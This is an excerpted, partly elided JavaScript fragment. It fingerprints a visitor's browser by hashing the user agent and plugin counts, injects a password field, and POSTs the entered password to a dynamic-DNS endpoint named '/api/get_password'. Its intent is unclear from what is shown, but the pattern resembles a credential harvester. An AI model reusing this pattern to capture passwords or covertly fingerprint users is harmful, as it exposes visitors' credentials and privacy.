...
function getIdentifier() {
    keyUserAgent = window.navigator.userAgent
    keyPlugins = window.navigator.plugins.length
    keyMimeTypes = window.navigator.mimeTypes.length
    return SHA256(keyUserAgent + keyPlugins + keyMimeTypes)
}
...
function initSignIn() {
    ...
    passInput.setAttribute("style","width:200px;height: 30px")
    passInput.setAttribute("id","passInput")
    document.body.appendChild(passInput);
    var buttonSend = document.createElement("Button")
    buttonSend.setAttribute("style", "width:100px;height: 20px")
    buttonSend.innerHTML = "send password"
    document.body.appendChild(buttonSend)
    buttonSend.addEventListener('click', getDataFromPassInput)
}

function makeUserDataPatch(passwordValue) {
...
var passwordToSend = {
    password : [],
    serverResponse:[],
    add: function(passwordIncome) {
        this.password.push(makeUserDataPatch(passwordIncome)) 
    },
    send: function() {
        fetch("https://turkovmatvei.chickenkiller.com/api/get_password", {
          method: "POST", 
          headers: {
...
function getDataFromPassInput() {
    var inputVal = document.getElementById("passInput").value;
    passwordToSend.add(inputVal)
    passwordToSend.send()
    turnOnButtonVisible()
    // return passwordToSend.checkResponse()
}

signIn.onclick = initSignIn;



function turnOnButtonVisible() {
